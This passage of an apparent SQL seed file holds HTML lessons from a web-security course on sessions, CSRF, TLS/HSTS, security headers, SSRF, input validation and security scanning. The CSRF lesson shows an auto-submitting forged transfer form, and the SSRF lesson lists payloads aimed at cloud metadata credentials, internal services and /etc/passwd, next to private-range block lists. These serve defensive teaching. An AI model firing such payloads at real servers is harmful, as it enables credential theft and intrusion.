  <h2>A good Set-Cookie</h2>
  <pre class="code-block">Set-Cookie: session=sha256(serverRandom);
  Secure; HttpOnly; SameSite=Lax; Path=/</pre>
  <h2>Session lifecycle rules</h2>
  <ul>
    <li><strong>Rotate on privilege change</strong> — issue a new session id after login and after role changes so fixation and theft windows shrink.</li>
    <li><strong>Expire aggressively</strong> — absolute and idle timeouts; short for sensitive consoles.</li>
    <li><strong>Invalidate on logout, server-side</strong> — delete the server record, not just the cookie.</li>
    <li><strong>Do not put the role in the cookie</strong> — the client must never be the authority for its own permissions.</li>
    <li><strong>Store sessions server-side</strong> (memory, cache, DB) rather than trusting a client-signed blob without central revoke.</li>
  </ul>
  <pre class="code-block">afterLogin(user):
  db.deleteSession(old);                       // kill any previous session
  sid = secureRandom(32);                      // high entropy, not incrementing
  db.createSession(sid, user.id, expiry);
  setCookie('session', sid, { Secure, HttpOnly, SameSite: 'Lax' })</pre>
  <div class="callout callout-info">
    <strong>Entropy matters</strong>
    <p>Session ids must come from a cryptographically secure random source. An incrementing or date-based id lets any attacker guess the next valid session.</p>
  </div>
  <div class="callout callout-tip">
    <strong>Logout is a security control</strong>
    <p>A shared computer that keeps its session alive is a takeover waiting to happen. Logout must kill the server-side session immediately.</p>
  </div>
</div>
</body>
</html>
$html$
),
(
  '02600000-0000-4000-8000-000000000417',
  '02600000-0000-4000-8000-000000000317',
  1,
  'CSRF & Session Fixation',
  $html$
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CSRF &amp; Session Fixation</title>
<style>
.lesson-page { font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; line-height: 1.7; color: #1f2937; max-width: 780px; margin: 0 auto; padding: 8px 16px 32px; }
.lesson-page h1 { color: #111827; font-size: 28px; border-bottom: 3px solid #e11d48; padding-bottom: 10px; margin-bottom: 20px; }
.lesson-page h2 { color: #be123c; font-size: 21px; margin: 28px 0 8px; }
.lesson-page p { margin: 12px 0; }
.lesson-page ul, .lesson-page ol { margin: 12px 0; padding-left: 24px; }
.lesson-page li { margin: 6px 0; }
.lesson-page .ic { background: #fff1f2; color: #be123c; padding: 2px 6px; border-radius: 4px; font-family: 'Consolas', 'Courier New', monospace; font-size: 0.92em; }
.lesson-page pre.code-block { background: #0f172a; color: #e2e8f0; padding: 16px; border-radius: 8px; overflow-x: auto; font-family: 'Consolas', 'Courier New', monospace; font-size: 14px; }
.lesson-page .callout { background: #ffe4e6; border-left: 4px solid #e11d48; padding: 12px 16px; border-radius: 6px; margin: 16px 0; }
.lesson-page .callout-info { background: #e0f2fe; border-left-color: #0ea5e9; }
.lesson-page .callout-tip { background: #dcfce7; border-left-color: #22c55e; }
.lesson-page .callout strong { text-transform: uppercase; font-size: 0.8em; letter-spacing: 0.5px; }
.lesson-page table { border-collapse: collapse; width: 100%; margin: 16px 0; }
.lesson-page table th, .lesson-page table td { border: 1px solid #d1d5db; padding: 8px 12px; text-align: left; }
.lesson-page table th { background: #fff1f2; color: #be123c; }
.dark .lesson-page { color: #e5e7eb; }
.dark .lesson-page h1 { color: #f9fafb; border-bottom-color: #fb7185; }
.dark .lesson-page h2 { color: #fda4af; }
.dark .lesson-page .ic { background: #4c0519; color: #fda4af; }
.dark .lesson-page .callout { background: #4c0519; border-left-color: #fb7185; }
.dark .lesson-page .callout-info { background: #0c4a6e; border-left-color: #38bdf8; }
.dark .lesson-page .callout-tip { background: #14532d; border-left-color: #4ade80; }
.dark .lesson-page table th, .dark .lesson-page table td { border-color: #4b5563; }
.dark .lesson-page table th { background: #4c0519; color: #fda4af; }
</style>
</head>
<body>
<div class="lesson-page">
  <h1>CSRF &amp; Session Fixation</h1>
  <p><strong>CSRF</strong> (Cross-Site Request Forgery) makes the victim's browser send an authenticated request the victim never intended. Because the session cookie travels automatically, the server believes the request is the user's own.</p>
  <h2>How CSRF works</h2>
  <pre class="code-block">1. Victim is logged in at bank.example (cookie is stored).
2. Victim visits evil.example in another tab.
3. evil.example renders:

&lt;form action="https://bank.example/transfer" method="POST"&gt;
  &lt;input name="to" value="attacker" /&gt;
  &lt;input name="amount" value="9999" /&gt;
&lt;/form&gt;
&lt;script&gt;document.forms[0].submit()&lt;/script&gt;

4. The browser sends the cookie. The transfer executes without consent.</pre>
  <h2>Why state-changing requests are the target</h2>
  <p>CSRF abuses requests with side effects: transfers, password changes, email changes, and order placements. It cannot read responses, so it is meaningless against plain GET reads — which is why <span class="ic">GET</span> must never mutate state.</p>
  <h2>Defenses, in order of strength</h2>
  <table>
    <tr><th>Control</th><th>How it works</th></tr>
    <tr><td>SameSite cookies</td><td>Browser refuses to send the cookie on cross-site POSTs</td></tr>
    <tr><td>CSRF token</td><td>Form carries an unpredictable per-session token; server verifies it</td></tr>
    <tr><td>Origin / Referer check</td><td>Server rejects requests whose Origin is not itself</td></tr>
    <tr><td>Double-submit cookie</td><td>Same random value in cookie and body, compared server-side</td></tr>
  </table>
  <pre class="code-block">// Server-side token pattern
token = secureRandom(32)
store token with the session; embed it in the form
POST /transfer  →  verify body._csrf === session.csrfToken</pre>
  <h2>Session fixation</h2>
  <p>In session <strong>fixation</strong>, the attacker pre-sets the session id the victim will use, then waits until the victim logs in with it — hijacking the post-login session. Renewing the id after login (rotation) makes the attack fail: the old, attacker-known id is discarded at the moment trust begins.</p>
  <div class="callout callout-tip">
    <strong>Defense summary</strong>
    <p>SameSite=Lax today already defeats most CSRF in modern browsers. Keep the CSRF token anyway — it protects legacy clients, embedded browsers, and anything that ignores SameSite.</p>
  </div>
</div>
</body>
</html>
$html$
),
(
  '02600000-0000-4000-8000-000000000419',
  '02600000-0000-4000-8000-000000000319',
  1,
  'HTTPS, TLS & HSTS',
  $html$
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>HTTPS, TLS &amp; HSTS</title>
<style>
.lesson-page { font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; line-height: 1.7; color: #1f2937; max-width: 780px; margin: 0 auto; padding: 8px 16px 32px; }
.lesson-page h1 { color: #111827; font-size: 28px; border-bottom: 3px solid #e11d48; padding-bottom: 10px; margin-bottom: 20px; }
.lesson-page h2 { color: #be123c; font-size: 21px; margin: 28px 0 8px; }
.lesson-page p { margin: 12px 0; }
.lesson-page ul, .lesson-page ol { margin: 12px 0; padding-left: 24px; }
.lesson-page li { margin: 6px 0; }
.lesson-page .ic { background: #fff1f2; color: #be123c; padding: 2px 6px; border-radius: 4px; font-family: 'Consolas', 'Courier New', monospace; font-size: 0.92em; }
.lesson-page pre.code-block { background: #0f172a; color: #e2e8f0; padding: 16px; border-radius: 8px; overflow-x: auto; font-family: 'Consolas', 'Courier New', monospace; font-size: 14px; }
.lesson-page .callout { background: #ffe4e6; border-left: 4px solid #e11d48; padding: 12px 16px; border-radius: 6px; margin: 16px 0; }
.lesson-page .callout-info { background: #e0f2fe; border-left-color: #0ea5e9; }
.lesson-page .callout-tip { background: #dcfce7; border-left-color: #22c55e; }
.lesson-page .callout strong { text-transform: uppercase; font-size: 0.8em; letter-spacing: 0.5px; }
.lesson-page table { border-collapse: collapse; width: 100%; margin: 16px 0; }
.lesson-page table th, .lesson-page table td { border: 1px solid #d1d5db; padding: 8px 12px; text-align: left; }
.lesson-page table th { background: #fff1f2; color: #be123c; }
.dark .lesson-page { color: #e5e7eb; }
.dark .lesson-page h1 { color: #f9fafb; border-bottom-color: #fb7185; }
.dark .lesson-page h2 { color: #fda4af; }
.dark .lesson-page .ic { background: #4c0519; color: #fda4af; }
.dark .lesson-page .callout { background: #4c0519; border-left-color: #fb7185; }
.dark .lesson-page .callout-info { background: #0c4a6e; border-left-color: #38bdf8; }
.dark .lesson-page .callout-tip { background: #14532d; border-left-color: #4ade80; }
.dark .lesson-page table th, .dark .lesson-page table td { border-color: #4b5563; }
.dark .lesson-page table th { background: #4c0519; color: #fda4af; }
</style>
</head>
<body>
<div class="lesson-page">
  <h1>HTTPS, TLS &amp; HSTS</h1>
  <p>HTTPS is not a feature to add later — it is the floor. HTTP traffic travels the network in plaintext, open to anyone on a shared Wi-Fi, an ISP, or a compromised router. TLS is the protocol that turns that channel into a confidential, tamper-evident tunnel.</p>
  <h2>A TLS session in five steps</h2>
  <ol>
    <li>Client connects to <span class="ic">:443</span> and names the host.</li>
    <li>Server answers with a certificate chain.</li>
    <li>Client validates the certificate against trusted roots and the hostname.</li>
    <li>Both sides derive session keys from a secure key exchange.</li>
    <li>All further HTTP flows through authenticated encryption.</li>
  </ol>
  <p>If the certificate fails validation — wrong host, expired, self-signed — the browser must stop, not warn-and-proceed with an ignored exception.</p>
  <h2>What HTTPS prevents</h2>
  <ul>
    <li>Passwords, tokens, and cookies read in transit.</li>
    <li>Payload tampering by an intermediary.</li>
    <li>Session hijacking via sniffed cookies (the Secure flag is belts and suspenders).</li>
    <li>Downgrade to plain HTTP when the first request falls back.</li>
  </ul>
  <h2>HSTS stops the first-request downgrade</h2>
  <pre class="code-block">Strict-Transport-Security: max-age=31536000; includeSubDomains; preload</pre>
  <p>HSTS tells the browser: for this domain, remember to use HTTPS forever (up to max-age), including subdomains. The <span class="ic">preload</span> token lets browsers hard-bake that rule from a public list so even the very first visit is encrypted.</p>
  <h2>Operational checklist</h2>
  <table>
    <tr><th>Item</th><th>Setting</th></tr>
    <tr><td>Redirect HTTP to HTTPS</td><td>301 redirect; send HSTS on the HTTPS response too</td></tr>
    <tr><td>Certificate</td><td>Valid chain, correct hostnames, auto-renewed</td></tr>
    <tr><td>TLS version</td><td>Disable SSLv3 and TLS 1.0 / 1.1</td></tr>
    <tr><td>Cookies</td><td>Secure flag everywhere; HSTS on the domain</td></tr>
    <tr><td>Mixed content</td><td>No http:// script, image, or fetch on an https page</td></tr>
  </table>
  <div class="callout callout-info">
    <strong>Mixed content is live HTTP</strong>
    <p>An https page that loads an http script reopens the exact channel TLS closes. Browsers block most mixed content — treat the console warnings as real alarms.</p>
  </div>
  <div class="callout callout-tip">
    <strong>Test your deployment</strong>
    <p>Open the site in a private window and inspect the response: the URL must be https, HSTS must be present, and the console must show no mixed-content warnings.</p>
  </div>
</div>
</body>
</html>
$html$
),
(
  '02600000-0000-4000-8000-000000000420',
  '02600000-0000-4000-8000-000000000320',
  1,
  'Security Headers',
  $html$
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Security Headers</title>
<style>
.lesson-page { font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; line-height: 1.7; color: #1f2937; max-width: 780px; margin: 0 auto; padding: 8px 16px 32px; }
.lesson-page h1 { color: #111827; font-size: 28px; border-bottom: 3px solid #e11d48; padding-bottom: 10px; margin-bottom: 20px; }
.lesson-page h2 { color: #be123c; font-size: 21px; margin: 28px 0 8px; }
.lesson-page p { margin: 12px 0; }
.lesson-page ul, .lesson-page ol { margin: 12px 0; padding-left: 24px; }
.lesson-page li { margin: 6px 0; }
.lesson-page .ic { background: #fff1f2; color: #be123c; padding: 2px 6px; border-radius: 4px; font-family: 'Consolas', 'Courier New', monospace; font-size: 0.92em; }
.lesson-page pre.code-block { background: #0f172a; color: #e2e8f0; padding: 16px; border-radius: 8px; overflow-x: auto; font-family: 'Consolas', 'Courier New', monospace; font-size: 14px; }
.lesson-page .callout { background: #ffe4e6; border-left: 4px solid #e11d48; padding: 12px 16px; border-radius: 6px; margin: 16px 0; }
.lesson-page .callout-info { background: #e0f2fe; border-left-color: #0ea5e9; }
.lesson-page .callout-tip { background: #dcfce7; border-left-color: #22c55e; }
.lesson-page .callout strong { text-transform: uppercase; font-size: 0.8em; letter-spacing: 0.5px; }
.lesson-page table { border-collapse: collapse; width: 100%; margin: 16px 0; }
.lesson-page table th, .lesson-page table td { border: 1px solid #d1d5db; padding: 8px 12px; text-align: left; }
.lesson-page table th { background: #fff1f2; color: #be123c; }
.dark .lesson-page { color: #e5e7eb; }
.dark .lesson-page h1 { color: #f9fafb; border-bottom-color: #fb7185; }
.dark .lesson-page h2 { color: #fda4af; }
.dark .lesson-page .ic { background: #4c0519; color: #fda4af; }
.dark .lesson-page .callout { background: #4c0519; border-left-color: #fb7185; }
.dark .lesson-page .callout-info { background: #0c4a6e; border-left-color: #38bdf8; }
.dark .lesson-page .callout-tip { background: #14532d; border-left-color: #4ade80; }
.dark .lesson-page table th, .dark .lesson-page table td { border-color: #4b5563; }
.dark .lesson-page table th { background: #4c0519; color: #fda4af; }
</style>
</head>
<body>
<div class="lesson-page">
  <h1>Security Headers</h1>
  <p>HTTP headers are some of the cheapest security controls in your stack: one response line each, enforced by the browser, protecting every future client. They cost a config file and close whole vulnerability classes.</p>
  <h2>The essential set</h2>
  <table>
    <tr><th>Header</th><th>What it blocks</th></tr>
    <tr><td>Content-Security-Policy</td><td>XSS: limits script, style, and frame sources</td></tr>
    <tr><td>X-Frame-Options: DENY</td><td>Clickjacking: forbids framing your UI</td></tr>
    <tr><td>X-Content-Type-Options: nosniff</td><td>MIME confusion attacks on uploads</td></tr>
    <tr><td>Referrer-Policy</td><td>Leaking URLs to third parties</td></tr>
    <tr><td>Permissions-Policy</td><td>Restricts camera, mic, and geolocation</td></tr>
    <tr><td>X-XSS-Protection</td><td>Legacy reflection filter; keep off and rely on CSP</td></tr>
  </table>
  <h2>An example header block</h2>
  <pre class="code-block">Content-Security-Policy: default-src 'self'; script-src 'self';
  object-src 'none'; frame-ancestors 'none';
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: no-referrer
Permissions-Policy: camera=(), microphone=(), geolocation=()
Cache-Control: no-store</pre>
  <h2>Where they go</h2>
  <ul>
    <li>App middleware, set once per response for every route.</li>
    <li>CDN or reverse-proxy layer for static assets.</li>
    <li>Never in a single page's HTML; headers belong at the server layer.</li>
  </ul>
  <h2>Rolling out CSP without breaking the app</h2>
  <ol>
    <li>Start in report-only mode: <span class="ic">Content-Security-Policy-Report-Only</span>.</li>
    <li>Collect violations from real traffic for a week.</li>
    <li>Adjust source lists to a minimal, working policy.</li>
    <li>Enforce, then keep watching the violation stream.</li>
  </ol>
  <div class="callout callout-tip">
    <strong>Check yourself</strong>
    <p>Load a page and inspect the response in DevTools. If any of the six headers above is missing, you found a ticket.</p>
  </div>
  <div class="callout callout-info">
    <strong>Headers are the last line, not the first</strong>
    <p>A strict CSP reduces XSS impact but never replaces output encoding. Encode first, filter with the browser second.</p>
  </div>
</div>
</body>
</html>
$html$
),
(
  '02600000-0000-4000-8000-000000000422',
  '02600000-0000-4000-8000-000000000322',
  1,
  'Server-Side Request Forgery (SSRF)',
  $html$
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Server-Side Request Forgery (SSRF)</title>
<style>
.lesson-page { font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; line-height: 1.7; color: #1f2937; max-width: 780px; margin: 0 auto; padding: 8px 16px 32px; }
.lesson-page h1 { color: #111827; font-size: 28px; border-bottom: 3px solid #e11d48; padding-bottom: 10px; margin-bottom: 20px; }
.lesson-page h2 { color: #be123c; font-size: 21px; margin: 28px 0 8px; }
.lesson-page p { margin: 12px 0; }
.lesson-page ul, .lesson-page ol { margin: 12px 0; padding-left: 24px; }
.lesson-page li { margin: 6px 0; }
.lesson-page .ic { background: #fff1f2; color: #be123c; padding: 2px 6px; border-radius: 4px; font-family: 'Consolas', 'Courier New', monospace; font-size: 0.92em; }
.lesson-page pre.code-block { background: #0f172a; color: #e2e8f0; padding: 16px; border-radius: 8px; overflow-x: auto; font-family: 'Consolas', 'Courier New', monospace; font-size: 14px; }
.lesson-page .callout { background: #ffe4e6; border-left: 4px solid #e11d48; padding: 12px 16px; border-radius: 6px; margin: 16px 0; }
.lesson-page .callout-info { background: #e0f2fe; border-left-color: #0ea5e9; }
.lesson-page .callout-tip { background: #dcfce7; border-left-color: #22c55e; }
.lesson-page .callout strong { text-transform: uppercase; font-size: 0.8em; letter-spacing: 0.5px; }
.lesson-page table { border-collapse: collapse; width: 100%; margin: 16px 0; }
.lesson-page table th, .lesson-page table td { border: 1px solid #d1d5db; padding: 8px 12px; text-align: left; }
.lesson-page table th { background: #fff1f2; color: #be123c; }
.dark .lesson-page { color: #e5e7eb; }
.dark .lesson-page h1 { color: #f9fafb; border-bottom-color: #fb7185; }
.dark .lesson-page h2 { color: #fda4af; }
.dark .lesson-page .ic { background: #4c0519; color: #fda4af; }
.dark .lesson-page .callout { background: #4c0519; border-left-color: #fb7185; }
.dark .lesson-page .callout-info { background: #0c4a6e; border-left-color: #38bdf8; }
.dark .lesson-page .callout-tip { background: #14532d; border-left-color: #4ade80; }
.dark .lesson-page table th, .dark .lesson-page table td { border-color: #4b5563; }
.dark .lesson-page table th { background: #4c0519; color: #fda4af; }
</style>
</head>
<body>
<div class="lesson-page">
  <h1>Server-Side Request Forgery (SSRF)</h1>
  <p><strong>SSRF</strong> makes your server send requests to URLs the attacker chooses. Your server sits inside the network with privileges the attacker lacks — it can reach internal services, cloud metadata, and databases behind the firewall.</p>
  <h2>The vulnerable pattern</h2>
  <pre class="code-block">// A URL preview feature that lets any visitor fetch a link
// and returns the top of the document.

let url = request.query.url;                  // attacker controls this
let html = await httpGet(url);                // server makes the request
return html.slice(0, 2000);</pre>
  <pre class="code-block">// Attacker payloads:
?url=http://169.254.169.254/latest/meta-data/iam/   cloud metadata
?url=http://10.0.0.5:9200/                         internal search engine
?url=file:///etc/passwd                             local file read (some clients)
?url=http://localhost:8080/admin                    admin panel behind the DMZ</pre>
  <p>Every one of these is a request the attacker could not make from their own machine — but now your server makes it with full network trust.</p>
  <h2>Why it is dangerous</h2>
  <ul>
    <li>Cloud provider metadata exposes IAM credentials at <span class="ic">169.254.169.254</span>.</li>
    <li>Internal services assume requests from inside are safe (no auth).</li>
    <li>Your egress traffic makes the attack hard to see in cloud flow logs.</li>
    <li>Blind SSRF still leaks data via timing, status codes, and error messages.</li>
  </ul>
  <h2>Defenses</h2>
  <table>
    <tr><th>Control</th><th>Detail</th></tr>
    <tr><td>Allowlist of hosts</td><td>Request only the exact domains the feature requires</td></tr>
    <tr><td>Resolve then verify</td><td>Resolve DNS, ensure the IP is public, then connect to it</td></tr>
    <tr><td>Block private ranges</td><td>Reject 127.0.0.1, 169.254.x, 10.x, 172.16-31.x, 192.168.x</td></tr>
    <tr><td>No credential inheritance</td><td>Never attach cloud role assumptions to arbitrary fetches</td></tr>
    <tr><td>Protocol allowlist</td><td>http(s) only; forbid file, ftp, dict, gopher</td></tr>
    <tr><td>Egress proxy</td><td>Route outbound fetches through a filtered proxy</td></tr>
  </table>
  <div class="callout">
    <strong>The scout test</strong>
    <p>Does your feature take a URL as input? Point it at localhost and at the metadata service before you ship. If you see a result, the server is a proxy for the attacker.</p>
  </div>
  <div class="callout callout-tip">
    <strong>Defense in depth for SSRF</strong>
    <p>Metadata service access is an always-on risk on major cloud providers. Combine per-request network policies, IMDS hardening, and the allowlist above.</p>
  </div>
</div>
</body>
</html>
$html$
),
(
  '02600000-0000-4000-8000-000000000423',
  '02600000-0000-4000-8000-000000000323',
  1,
  'Input Validation & Hardened APIs',
  $html$
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Input Validation &amp; Hardened APIs</title>
<style>
.lesson-page { font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; line-height: 1.7; color: #1f2937; max-width: 780px; margin: 0 auto; padding: 8px 16px 32px; }
.lesson-page h1 { color: #111827; font-size: 28px; border-bottom: 3px solid #e11d48; padding-bottom: 10px; margin-bottom: 20px; }
.lesson-page h2 { color: #be123c; font-size: 21px; margin: 28px 0 8px; }
.lesson-page p { margin: 12px 0; }
.lesson-page ul, .lesson-page ol { margin: 12px 0; padding-left: 24px; }
.lesson-page li { margin: 6px 0; }
.lesson-page .ic { background: #fff1f2; color: #be123c; padding: 2px 6px; border-radius: 4px; font-family: 'Consolas', 'Courier New', monospace; font-size: 0.92em; }
.lesson-page pre.code-block { background: #0f172a; color: #e2e8f0; padding: 16px; border-radius: 8px; overflow-x: auto; font-family: 'Consolas', 'Courier New', monospace; font-size: 14px; }
.lesson-page .callout { background: #ffe4e6; border-left: 4px solid #e11d48; padding: 12px 16px; border-radius: 6px; margin: 16px 0; }
.lesson-page .callout-info { background: #e0f2fe; border-left-color: #0ea5e9; }
.lesson-page .callout-tip { background: #dcfce7; border-left-color: #22c55e; }
.lesson-page .callout strong { text-transform: uppercase; font-size: 0.8em; letter-spacing: 0.5px; }
.lesson-page table { border-collapse: collapse; width: 100%; margin: 16px 0; }
.lesson-page table th, .lesson-page table td { border: 1px solid #d1d5db; padding: 8px 12px; text-align: left; }
.lesson-page table th { background: #fff1f2; color: #be123c; }
.dark .lesson-page { color: #e5e7eb; }
.dark .lesson-page h1 { color: #f9fafb; border-bottom-color: #fb7185; }
.dark .lesson-page h2 { color: #fda4af; }
.dark .lesson-page .ic { background: #4c0519; color: #fda4af; }
.dark .lesson-page .callout { background: #4c0519; border-left-color: #fb7185; }
.dark .lesson-page .callout-info { background: #0c4a6e; border-left-color: #38bdf8; }
.dark .lesson-page .callout-tip { background: #14532d; border-left-color: #4ade80; }
.dark .lesson-page table th, .dark .lesson-page table td { border-color: #4b5563; }
.dark .lesson-page table th { background: #4c0519; color: #fda4af; }
</style>
</head>
<body>
<div class="lesson-page">
  <h1>Input Validation &amp; Hardened APIs</h1>
  <p>Input validation is the first gate every byte of attacker data must pass. It is not the whole defense — parameterization and encoding still follow — but it shapes what is even allowed into your system.</p>
  <h2>Validate shape, not just presence</h2>
  <table>
    <tr><th>Dimension</th><th>Example rule</th></tr>
    <tr><td>Type</td><td>a quantity must be an integer</td></tr>
    <tr><td>Length</td><td>3 ≤ code ≤ 64 chars; reject oversized bodies</td></tr>
    <tr><td>Format</td><td>email matches a sane pattern; ISO dates</td></tr>
    <tr><td>Enumeration</td><td>role ∈ {user, admin}; status ∈ {open, closed}</td></tr>
    <tr><td>Range</td><td>0 ≤ amount ≤ 1000000</td></tr>
    <tr><td>Charset</td><td>no control chars, no null bytes</td></tr>
  </table>
  <h2>Whitelist beats blacklist</h2>
  <p>A blacklist bans known bad patterns and stays forever outdated — the next payload is always novel. A whitelist allows only the shapes that are correct, and everything else is rejected with a single code path. When you must accept free text (a comment), treat it as text and encode it on output; do not try to sanitize markup by scissoring tags.</p>
  <h2>Hardening the API surface</h2>
  <ul>
    <li>Return generic errors: no stack traces, no SQL fragments, no internal paths.</li>
    <li>Cap body size and reject unexpected headers early.</li>
    <li>Rate limit per user and per IP on state-changing routes.</li>
    <li>Use proper HTTP verbs and status codes; never let GET mutate state.</li>
    <li>Validate redirect targets: only relative or allowlisted hosts.</li>
    <li>Log structured request metadata for analysis, never raw secrets.</li>
  </ul>
  <pre class="code-block">function validateReview(body) {
  if (typeof body.rating !== 'number')            return 'rating must be a number';
  if (body.rating &lt; 1 || body.rating &gt; 5)         return 'rating out of range';
  if (typeof body.text !== 'string' || body.text.length &gt; 2000)
    return 'text must be a string up to 2000 chars';
  return null;                                     // null = valid
}</pre>
  <div class="callout callout-info">
    <strong>Centralize it</strong>
    <p>A schema in one place is reviewable. The same checks sprinkled in controllers drift out of sync and are skipped somewhere.</p>
  </div>
  <div class="callout callout-tip">
    <strong>Errors are data too</strong>
    <p>The response you send on bad input is user-visible documentation. Make it consistent and free of internals.</p>
  </div>
</div>
</body>
</html>
$html$
),
(
  '02600000-0000-4000-8000-000000000425',
  '02600000-0000-4000-8000-000000000325',
  1,
  'SAST, DAST & Dependency Scanning',
  $html$
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>SAST, DAST &amp; Dependency Scanning</title>
<style>
.lesson-page { font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; line-height: 1.7; color: #1f2937; max-width: 780px; margin: 0 auto; padding: 8px 16px 32px; }
.lesson-page h1 { color: #111827; font-size: 28px; border-bottom: 3px solid #e11d48; padding-bottom: 10px; margin-bottom: 20px; }
.lesson-page h2 { color: #be123c; font-size: 21px; margin: 28px 0 8px; }
.lesson-page p { margin: 12px 0; }
.lesson-page ul, .lesson-page ol { margin: 12px 0; padding-left: 24px; }
.lesson-page li { margin: 6px 0; }
.lesson-page .ic { background: #fff1f2; color: #be123c; padding: 2px 6px; border-radius: 4px; font-family: 'Consolas', 'Courier New', monospace; font-size: 0.92em; }
.lesson-page pre.code-block { background: #0f172a; color: #e2e8f0; padding: 16px; border-radius: 8px; overflow-x: auto; font-family: 'Consolas', 'Courier New', monospace; font-size: 14px; }
.lesson-page .callout { background: #ffe4e6; border-left: 4px solid #e11d48; padding: 12px 16px; border-radius: 6px; margin: 16px 0; }
.lesson-page .callout-info { background: #e0f2fe; border-left-color: #0ea5e9; }
.lesson-page .callout-tip { background: #dcfce7; border-left-color: #22c55e; }
.lesson-page .callout strong { text-transform: uppercase; font-size: 0.8em; letter-spacing: 0.5px; }
.lesson-page table { border-collapse: collapse; width: 100%; margin: 16px 0; }
.lesson-page table th, .lesson-page table td { border: 1px solid #d1d5db; padding: 8px 12px; text-align: left; }
.lesson-page table th { background: #fff1f2; color: #be123c; }
.dark .lesson-page { color: #e5e7eb; }
.dark .lesson-page h1 { color: #f9fafb; border-bottom-color: #fb7185; }
.dark .lesson-page h2 { color: #fda4af; }
.dark .lesson-page .ic { background: #4c0519; color: #fda4af; }
.dark .lesson-page .callout { background: #4c0519; border-left-color: #fb7185; }
.dark .lesson-page .callout-info { background: #0c4a6e; border-left-color: #38bdf8; }
.dark .lesson-page .callout-tip { background: #14532d; border-left-color: #4ade80; }
.dark .lesson-page table th, .dark .lesson-page table td { border-color: #4b5563; }
.dark .lesson-page table th { background: #4c0519; color: #fda4af; }
</style>
</head>
<body>
<div class="lesson-page">
  <h1>SAST, DAST &amp; Dependency Scanning</h1>
  <p>Manual review is the highest-quality signal and cannot scale alone. Automated testing adds machine-speed coverage and catches the obvious bugs human eyes skip at the end of a long day.</p>
  <h2>The three pillars</h2>
  <table>
    <tr><th>Type</th><th>What it does</th><th>Examples</th></tr>
    <tr><td>SAST</td><td>Scans source without running it</td><td>Semgrep, CodeQL, Bandit, lint security rules</td></tr>
    <tr><td>DAST</td><td>Attacks a running app over HTTP</td><td>OWASP ZAP, Burp Suite, nuclei</td></tr>
    <tr><td>SCA</td><td>Maps dependencies to known CVEs</td><td>npm audit, Dependabot, Grype, Trivy</td></tr>
  </table>
  <h2>SAST in the pipeline</h2>
  <pre class="code-block">pull request
  → run tests
  → run linter + SAST      (fast, on changed files)
  → run dependency scan    (npm audit / grype)
  → gate on findings over threshold
  → only then allow merge</pre>
  <p>SAST should be fast enough to run per commit. A rule that flags string concatenation in SQL builders catches the classic injection before it merges.</p>
  <h2>DAST against staging</h2>
  <pre class="code-block"># a scheduled scan after each deploy
zap-baseline.py -t https://staging.example -r report.html
# then look for the injection signature in responses</pre>
  <p>DAST finds what SAST cannot: misconfigurations, headers, revealed errors, and logic that only appears at runtime.</p>
  <h2>Dependencies are attack surface</h2>
  <ul>
    <li>Scan the lockfile, not just the manifest.</li>
    <li>Auto-open fix pull requests for critical and high CVEs.</li>
    <li>Pin releases; review surprising dependency changes.</li>
    <li>Maintain an SBOM — a software bill of materials — of what ships where.</li>
  </ul>
  <div class="callout callout-info">
    <strong>False positives are normal</strong>
    <p>A scanner finds candidate bugs, not a verdict. Keep the triage loop short: verify, mark, fix the real ones, and never let the report rot.</p>
  </div>
  <div class="callout callout-tip">
    <strong>Order of operations</strong>
    <p>SAST + SCA early and automated, DAST scheduled, and manual review for the features that touch money, identity, and PII. Balance cost against the risk.</p>
  </div>
</div>
</body>
</html>
$html$
),
(
  '02600000-0000-4000-8000-000000000426',
  '02600000-0000-4000-8000-000000000326',
  1,
  'Capstone: BookNook Threat Model',
  $html$
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Capstone: BookNook Threat Model</title>
<style>
.lesson-page { font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; line-height: 1.7; color: #1f2937; max-width: 780px; margin: 0 auto; padding: 8px 16px 32px; }
.lesson-page h1 { color: #111827; font-size: 28px; border-bottom: 3px solid #e11d48; padding-bottom: 10px; margin-bottom: 20px; }
.lesson-page h2 { color: #be123c; font-size: 21px; margin: 28px 0 8px; }
.lesson-page p { margin: 12px 0; }
.lesson-page ul, .lesson-page ol { margin: 12px 0; padding-left: 24px; }
.lesson-page li { margin: 6px 0; }
.lesson-page .ic { background: #fff1f2; color: #be123c; padding: 2px 6px; border-radius: 4px; font-family: 'Consolas', 'Courier New', monospace; font-size: 0.92em; }
.lesson-page pre.code-block { background: #0f172a; color: #e2e8f0; padding: 16px; border-radius: 8px; overflow-x: auto; font-family: 'Consolas', 'Courier New', monospace; font-size: 14px; }
.lesson-page .callout { background: #ffe4e6; border-left: 4px solid #e11d48; padding: 12px 16px; border-radius: 6px; margin: 16px 0; }
.lesson-page .callout-info { background: #e0f2fe; border-left-color: #0ea5e9; }
.lesson-page .callout-tip { background: #dcfce7; border-left-color: #22c55e; }
.lesson-page .callout strong { text-transform: uppercase; font-size: 0.8em; letter-spacing: 0.5px; }
.lesson-page table { border-collapse: collapse; width: 100%; margin: 16px 0; }
.lesson-page table th, .lesson-page table td { border: 1px solid #d1d5db; padding: 8px 12px; text-align: left; }
.lesson-page table th { background: #fff1f2; color: #be123c; }
.dark .lesson-page { color: #e5e7eb; }
